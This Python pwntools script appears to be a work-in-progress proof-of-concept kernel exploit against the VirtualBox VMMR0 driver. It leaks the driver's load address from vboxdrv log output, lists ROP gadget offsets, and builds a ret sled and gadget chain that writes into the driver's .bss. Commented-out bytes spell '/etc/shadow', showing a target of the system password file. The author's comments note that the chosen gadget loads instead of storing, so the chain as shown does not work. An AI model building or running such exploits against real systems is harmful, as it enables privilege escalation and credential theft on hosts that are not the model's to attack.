#!/usr/bin/python3
import sys
from pwn import *
context.clear(arch='amd64', kernel='amd64')
'''
gcc -g -D OF_SIZE=128 userspace.c -o userspace
python3 ./poc.py VMMR0.r0 payload 100

VMMR0:  http://www.ropshell.com/ropsearch?h=f81f7bdd9ffe47e093805c9d2f626f38
pop rdi; ret;                       VMMR0 + 0x07b62a
pop rax; ret;                       VMMR0 + 0x01f7bd



mov rax, [rdi + 0x2a50]; ret;       VMMR0 + 0x0b7470

THIS DOES NOT STORE TO MEMORY!!! ^ THIS TAKES RDI+0X0A50 AND
STORES WHAT IS IN MEMORY THERE INTO RAX

WHAT WE NEED IS
mov [rdi], rax

WHICH IN x64 IS
0:  48 89 07                mov    QWORD PTR [rdi],rax



syscall; ret;                       VMMR0 + 0x012c3c0
push rsp; ret;                      VMMR0 + 0x01f7ad
pop rbp; ret;                       VMMR0 + 0x028d
xor eax, eax; ret;                  VMMR0 + 0x08b8
retq;                               VMMR0 + 0x01ea33
'''

# For some insane reason (probably due to how ELF works) when we load the
# target_binary into memory in userspace.c everything is 0x40 above where it
# normally is. Therefore we use some addition to fix that.
class Adjuster(object):
    def __init__(self, offset):
        self.offset = offset

    def __call__(self, addr):
        return self.offset + addr
adjuster = Adjuster(0x40)


def leaked(start_leaker, search_for):
    # Get the address from the leak
    leaker = process(start_leaker)
    leak = [l for l in leaker.recv().decode('utf-8').replace('\r', '').split('\n') if 'vboxdrv:' in l and search_for in l]
    if len(leak) < 1:
        return
    leak = leak[-1].split()
    if len(leak) < 3:
        return
    leak = int(leak[-2], 16)
    return leak, leaker

def build(leak, gadget_file, sled_length):
    # Load the target binary
    with open(gadget_file, 'rb') as i:
        binary = ELF.from_bytes(i.read(), vma=leak)
    # Create the ROP stack
    rop = ROP(binary)

    # Put a nice lil ret seld on der
    for i in range(0, sled_length):
        # ret;
        rop.raw(adjuster(leak + 0x01ea33))

    # Build a string in the .bss section of the target driver
    # the .bss section starts at the address the driver was loaded
    # We have to adjust because the gadget we have is rdi + 0x2a50
    string_location = leak

    # pop rax; ret;
    rop.raw(adjuster(leak + 0x01f7bd))
    # /etc
    # rop.raw(b'cte/')
    rop.raw(b'AAAA')
    # pop rdi; ret;
    rop.raw(adjuster(leak + 0x07b62a))
    # set rdi
    rop.raw(adjuster(string_location - 0x02a50))
    # mov rax, [rdi + 0x2a50]; ret;
    rop.raw(adjuster(leak + 0x0b7470))

    # pop rax; ret;
    rop.raw(adjuster(leak + 0x01f7bd))
    # /sha
    # rop.raw(b'ahs/')
    rop.raw(b'AAAA')
    # pop rdi; ret;
    rop.raw(adjuster(leak + 0x07b62a))
    # set rdi
    rop.raw(adjuster(string_location - 0x02a50 + 4))
    # mov rax, [rdi + 0x2a50]; ret;
    rop.raw(adjuster(leak + 0x0b7470))

    # pop rax; ret;
    rop.raw(adjuster(leak + 0x01f7bd))
    # dow\x00
    # rop.raw(b'\x00wod')
    rop.raw(b'\x00AAA')
    # pop rdi; ret;
    rop.raw(adjuster(leak + 0x07b62a))
    # set rdi
    rop.raw(adjuster(string_location - 0x02a50 + 8))
    # mov rax, [rdi + 0x2a50]; ret;
    rop.raw(adjuster(leak + 0x0b7470))

    # Display our completed ROP chain
    print(rop.dump())
    # Return it as bytes to be writen out
    return bytes(rop)

def create_exploit(target_binary, payload_file, sled_length, leak):
    exploit = build(leak, target_binary, sled_length)
    with open(payload_file, 'wb') as o:
        o.write(exploit)
    return exploit

def attack(target_binary, payload_file, sled_length):
    leak, leaker = leaked(['./userspace', target_binary, payload_file],
            target_binary)
    print('Leaked address is', str(hex(leak)))
    exploit = create_exploit(target_binary, payload_file, sled_length, leak)
    leaker.shutdown('send')
    leaker.shutdown()

def main():
    # Make sure we have enough args
    if len(sys.argv) < 4:
        print('Usage %s target_binary, payload_file, sled_length [leak]'.format(sys.argv[1]))
        sys.exit(1)
    # Set the common variables
    target_binary = sys.argv[1]
    payload_file = sys.argv[2]
    sled_length = int(sys.argv[3])
    # Choose what to do baised on number of vars given
    if len(sys.argv) == 4:
        attack(target_binary, payload_file, sled_length)
    else:
        leak = int(sys.argv[4], 16)
        create_exploit(target_binary, payload_file, sled_length, leak)

if __name__ == '__main__':
    main()
